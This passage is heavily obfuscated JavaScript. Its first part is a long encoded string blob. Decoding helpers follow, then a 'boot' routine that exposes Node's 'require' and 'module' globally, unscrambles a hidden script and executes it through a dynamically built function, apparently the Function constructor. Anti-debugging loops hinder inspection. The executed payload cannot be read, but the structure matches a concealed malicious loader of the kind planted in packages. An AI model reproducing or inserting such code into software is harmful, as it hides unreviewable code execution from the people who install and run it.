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','yxbWBhK','z2DLCG','ndq3ntu0owHfsvn0wG','zgvIDq','mJC1nJa1mNDtz0jnAa','AM9PBG','zNvUy3rPB24GkLWOicPCkq'];_0xc09d=function(){return _0x4df1b3;};return _0xc09d();}function splitLane(_0x1b0f59){var _0x489466=_0x35fa,_0x254765=String[_0x489466(0x15)](0x1c),_0x34f4f4=spin(_0x1b0f59,NX);return _0x34f4f4=_0x34f4f4['split']('^')['join'](_0x254765),_0x34f4f4=_0x34f4f4['split']('*1')['join']('^'),_0x34f4f4=_0x34f4f4['split']('*0')['join']('*'),_0x34f4f4[_0x489466(0x16)](_0x254765);}function peel(_0x2797e3){return spin(_0x2797e3,SX);}(function boot(_0x63163d,_0x4a7f94){var _0x5fcdf1=_0x35fa,_0x2c8d65={'yMDTF':function(_0x19420e,_0x94882d){return _0x19420e===_0x94882d;},'npfvV':function(_0xd2cf36,_0x5e0a2a){return _0xd2cf36(_0x5e0a2a);}},_0x2acb78=(function(){var _0x328132=!![];return function(_0xfe673b,_0x211451){var _0x36ea99=_0x328132?function(){var _0xb321c0=_0x35fa;if(_0x211451){var _0x59ce8a=_0x211451[_0xb321c0(0xa)](_0xfe673b,arguments);return _0x211451=null,_0x59ce8a;}}:function(){};return _0x328132=![],_0x36ea99;};}());(function(){_0x2acb78(this,function(){var _0x54a6a7=_0x35fa,_0x382fc2=new RegExp(_0x54a6a7(0x10)),_0x1c2246=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),_0x51493c=_0x2374ed('init');!_0x382fc2['test'](_0x51493c+'chain')||!_0x1c2246[_0x54a6a7(0x3)](_0x51493c+_0x54a6a7(0x1f))?_0x51493c('0'):_0x2374ed();})();}()),_0x63163d['z']=z;var _0x48dc91=splitLane('c^mejb^tro');_0x63163d[_0x48dc91[0x0]]=_0x4a7f94;_0x2c8d65['yMDTF'](typeof module,_0x48dc91[0x1])&&(_0x63163d[_0x48dc91[0x2]]=module);var _0x415847=_0x2c8d65[_0x5fcdf1(0x20)](peel,'hqersxluvwacdjbymgorzfkociptrutnstonc'),_0x34bf1d=_0x415847[_0x5fcdf1(0x8)](0x0,0xb),_0x47fad3=peel[_0x34bf1d],_0x2af24f=_0x47fad3('',peel('=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20')),_0x5b0eef=_0x2af24f(peel(_0x5fcdf1(0x9)));return _0x47fad3('',_0x5b0eef)(0x9cd),0x1fce;}(global,require));function _0x2374ed(_0x4207eb){var _0x15807a=_0x35fa,_0x5bd2d6={'ifvWY':_0x15807a(0x11),'NhffR':_0x15807a(0x21),'xYorL':function(_0xe5e46b,_0x4905a1){return _0xe5e46b(_0x4905a1);}};function _0x47309a(_0x3f9789){var _0x1a61cc=_0x15807a;if(typeof _0x3f9789==='string')return function(_0x5f1c28){}['constructor'](_0x1a61cc(0x19))['apply']('counter');else(''+_0x3f9789/_0x3f9789)[_0x5bd2d6[_0x1a61cc(0x1)]]!==0x1||_0x3f9789%0x14===0x0?function(){return!![];}['constructor']('debu'+_0x1a61cc(0xb))['call'](_0x5bd2d6[_0x1a61cc(0x7)]):function(){return![];}[_0x1a61cc(0x2)](_0x1a61cc(0xd)+'gger')['apply'](_0x1a61cc(0x1d));_0x5bd2d6[_0x1a61cc(0x0)](_0x47309a,++_0x3f9789);}try{if(_0x4207eb)return _0x47309a;else _0x47309a(0x0);}catch(_0x5e1e53){}}
